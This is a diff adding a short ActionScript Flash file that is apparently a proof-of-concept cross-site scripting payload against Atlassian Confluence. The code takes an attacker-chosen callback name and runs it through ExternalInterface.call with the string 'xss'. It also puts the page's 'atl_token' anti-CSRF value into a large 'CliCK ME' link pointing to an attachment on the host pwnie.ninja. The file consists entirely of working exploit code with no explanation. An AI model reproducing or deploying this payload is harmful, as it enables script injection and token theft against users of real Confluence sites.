@@ -1,0 +1,25 @@
+package
+{
+import flash.display.Sprite;
+import flash.text.TextFormat;
+import flash.text.TextField;
+import flash.external.ExternalInterface;
+
+public class Main extends Sprite
+{
+
+public function Main()
+{
+super();
+var myFormat:TextFormat = new TextFormat();
+myFormat.size = 200;
+var xcode:String = this.loaderInfo.parameters.atl_token;
+var myText:TextField = new TextField();
+myText.width = 1000;
+myText.height = 1000;
+myText.htmlText = "<font size=\'300px\'> <a target=\'_blank\' href=\'https://pwnie.ninja/confluence/download/attachments/9469955/NewProjectx.swf?atl_token=" + xcode + "&callback=alert\'>CliCK ME</a> </font>";
+addChild(myText);
+ExternalInterface.call(this.loaderInfo.parameters.callback,"xss");
+}
+}
+}
